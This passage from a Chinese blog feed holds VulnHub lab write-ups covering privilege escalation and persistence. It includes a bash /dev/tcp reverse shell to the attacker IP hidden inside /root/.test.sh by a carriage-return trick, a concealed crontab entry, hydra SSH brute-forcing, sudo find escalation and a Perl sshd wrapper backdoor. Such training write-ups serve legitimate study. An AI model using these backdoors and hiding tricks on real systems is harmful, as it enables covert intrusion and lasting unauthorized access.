&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;寻找一些ippsec可以访问的东西&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;find / -group ippsec -type d 2&amp;gt;/dev/null | grep -v proc&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-220.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现我们可以访问位于 wordpress 目录中的 .git 目录&lt;br&gt;
我们的终端一直在弹出消息，而且这个消息是在 ippsec 上执行的&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;现在我们可以运行pspy64s检查 Red 是否正在执行我们在/var/www/wordpress/.git 目录中找到的文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wget https://github.com/DominicBreuker/pspy/archive/refs/heads/master.zip&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python -m http.server 80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wget 192.168.31.135/pspy64s&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./pspy64s&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-221.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;看到 /usr/bin/gcc/var/www/wordpress/.git/supersecretfileuc.c -o /var/www/wordpress/.git/rev 被执行&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-222.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;现在我们已经很明确了，supersecretfileuc.c 这个文件会被执行&lt;br&gt;
而且是调用 root 权限去执行的这个文件，需要一个 c 的反弹 shell 的代码&lt;/p&gt;
&lt;h3 id=&#34;各种语言反弹&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#各种语言反弹&#34;&gt;#&lt;/a&gt; 各种语言反弹&lt;/h3&gt;
&lt;p&gt;各种语言反弹 shell 的代码：&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBvL1BheWxvYWRzQWxsVGhlVGhpbmdzL2Jsb2IvbWFzdGVyL01ldGhvZG9sb2d5JTIwYW5kJTIwUmVzb3VyY2VzL1JldmVyc2UlMjBTaGVsbCUyMENoZWF0c2hlZXQubWQjYw==&#34;&gt;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md#c&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;重新编辑 supersecretfileuc.c 这个文件&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-223.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;并在 4444 端口出监听&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-224.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 至此拿到了 root 权限，提权成功&lt;/p&gt;
&lt;h3 id=&#34;cat配合cron维权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cat配合cron维权&#34;&gt;#&lt;/a&gt; cat 配合 cron 维权&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;编写python程序显示如下内容：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;evil = &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4444 0&amp;gt;&amp;amp;1&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;normal = &amp;quot;echo &amp;#x27;Hello world!&amp;#x27;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;with open(&amp;quot;/root/.test.sh&amp;quot;, &amp;quot;w&amp;quot;) as f:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	output = &amp;quot;#!/bin/bash\n&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	output += normal + &amp;quot;;&amp;quot; + evil + &amp;quot; #\r&amp;quot; + normal + &amp;quot; &amp;quot; * (len(evil) + 3) + &amp;quot;\n&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	f.write(output)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-225.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python3 -m http.server 80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wget 192.168.31.135/1.py&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-226.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;用py执行此文件后，会生成 /root/.test.sh&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;使用&lt;span class=&#34;built_in&#34;&gt;cat&lt;/span&gt;看的时候看不到 payload，但使用more 或者 &lt;span class=&#34;built_in&#34;&gt;cat&lt;/span&gt; -A 就会暴露&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rm -f 1.py &amp;amp;&amp;amp; chmod +x /root/.test.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mv /root/test.sh /root/.test.sh &amp;amp;&amp;amp; /root/.test.sh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-227.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;成功反弹出去，实现了cat隐藏木马,将此文件加入到计划文件中：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(crontab - l;printf &amp;quot;*/1 * * * * /root/.test.sh;\rno crontab for `whoami`%100c\n&amp;quot;)|crontab -&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-228.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; cron 中同样是被隐藏的计划任务，只要我们 nc -lvvp 4449 等待上线即可&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/112%20THOTH/</guid>
            <title>VULNHUB 12 THOTH</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/112%20THOTH/</link>
            <category>VULNHUB 11-20</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvdGhvdGgtdGVjaC0xLDczNC8=&#34;&gt;https://www.vulnhub.com/entry/thoth-tech-1,734/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5OTkxODM3L2FydGljbGUvZGV0YWlscy8xMTk5NDQ5Mzc=&#34;&gt;https://blog.csdn.net/qq_39991837/article/details/119944937&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 THOTH：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1）arp 确定靶机地址&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-253.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 目标机器的 ip 地址： 192.168.31.229&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -A -p- 192.168.31.229 -oN /tmp/thoth.txt&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-254.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 21, 22, 80&lt;/p&gt;
&lt;h3 id=&#34;ftp-匿名登陆&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ftp-匿名登陆&#34;&gt;#&lt;/a&gt; FTP 匿名登陆&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;利用用户ftp和空密码登陆到ftp查看有没有敏感文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ftp 192.168.31.229&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dir &amp;amp;&amp;amp; get note.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-255.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 得到提示是 pwnlab 是该服务器的某一个用户，并且密码比较简单&lt;/p&gt;
&lt;h3 id=&#34;目录扫描&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#目录扫描&#34;&gt;#&lt;/a&gt; 目录扫描&lt;/h3&gt;
&lt;p&gt;80 网站信息收集，是个默认的 apache 界面&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-256.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;dirsearch -u http://192.168.31.229&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-257.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;gobuster dir -u http://192.168.31.229/ -x php,txt,html,zip,rar -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-253.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; gobuster 扫描后并没有什么发现&lt;/p&gt;
&lt;h3 id=&#34;hydra-爆破-ssh&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hydra-爆破-ssh&#34;&gt;#&lt;/a&gt; hydra 爆破 SSH&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;hydra 爆破可疑用户 pwdlab 的密码登陆ssh&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hydra -l pwnlab -P /usr/share/wordlists/rockyou.txt ssh://192.168.31.229 -f -t 4 -vV -o hydra.ssh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-259.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 账户：pwnlab 密码：babygirl1&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;登陆服务器&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh pwnlab@192.168.31.229&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;收集服务器信息：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat /etc/issue &amp;amp;&amp;amp; uname -a &amp;amp;&amp;amp; sudo -l&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;sudofind提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sudofind提权&#34;&gt;#&lt;/a&gt; sudo (find) 提权&lt;/h3&gt;
&lt;p&gt;发现可以直接通过无密码调用 root 权限的 find&lt;br&gt;
 寻找提权命令：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvZmluZC8=&#34;&gt;https://gtfobins.github.io/gtfobins/find/&lt;/span&gt;&lt;br&gt;
 &lt;code&gt;sudo find. -exec /bin/sh \; -quit&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-260.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 直接提升成了 root 账户&lt;/p&gt;
&lt;h3 id=&#34;ssh-wrapper维权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssh-wrapper维权&#34;&gt;#&lt;/a&gt; SSH wrapper 维权&lt;/h3&gt;
&lt;p&gt;参考地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ieXBhc3MwMDcuZ2l0aHViLmlvL0VtZXJnZW5jeS1SZXNwb25zZS1Ob3Rlcy9wcml2aWxlZ2Uv&#34;&gt;https://bypass007.github.io/Emergency-Response-Notes/privilege/&lt;/span&gt;&lt;br&gt;
 从 sshd fork 出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行了判断。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;靶机上依次执行一下命令：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd /usr/sbin/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mv sshd ../bin/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;#x27;#!/usr/bin/perl&amp;#x27; &amp;gt;sshd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;#x27;exec &amp;quot;/bin/sh&amp;quot; if(getpeername(STDIN) =~ /^..4A/);&amp;#x27; &amp;gt;&amp;gt;sshd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;#x27;exec&amp;#123;&amp;quot;/usr/bin/sshd&amp;quot;&amp;#125; &amp;quot;/usr/sbin/sshd&amp;quot;,@ARGV,&amp;#x27; &amp;gt;&amp;gt;sshd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod u+x sshd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/etc/init.d/sshd restart&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Service ssh restart&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-261.png&#34; alt&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;攻击机执行以下命令&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;socat STDIO TCP4:192.168.31.229:22,sourceport=13377&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;quot;import pty;pty.spawn(&amp;#x27;/bin/bash&amp;#x27;)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty raw -echo;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-262.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; ssh wrapper 权限维持成功，可免密登陆 root 账户&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/111%20DEATHNOTE/</guid>
            <title>VULNHUB 11 DEATHNOTE</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/111%20DEATHNOTE/</link>
            <category>VULNHUB 11-20</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZGVhdGhub3RlLTEsNzM5Lw==&#34;&gt;https://www.vulnhub.com/entry/deathnote-1,739/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpb253ZXJzb24vYXJ0aWNsZS9kZXRhaWxzLzEyMTU5NDU0NQ==&#34;&gt;https://blog.csdn.net/lionwerson/article/details/121594545&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 DEATHNOTE：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;通过 netdiscover 扫描当前网卡里边有哪些机器&lt;br&gt;
 &lt;code&gt;sudo netdiscover -i eth0 -r 192.168.31.0/24&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; myip.txt &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.1 192.168.31.25 192.168.31.58 192.168.31.86 192.168.31.33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.120 192.168.31.135 192.168.31.145 192.168.31.162 192.168.31.44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;获取靶机 ip 地址&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;去除一些已知ip的机器，对剩余IP进行端口扫描，判断目标IP&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo nmap -PA 192.168.31.107 --excludefile myip.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;或者使用 arp 扫描&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo arp 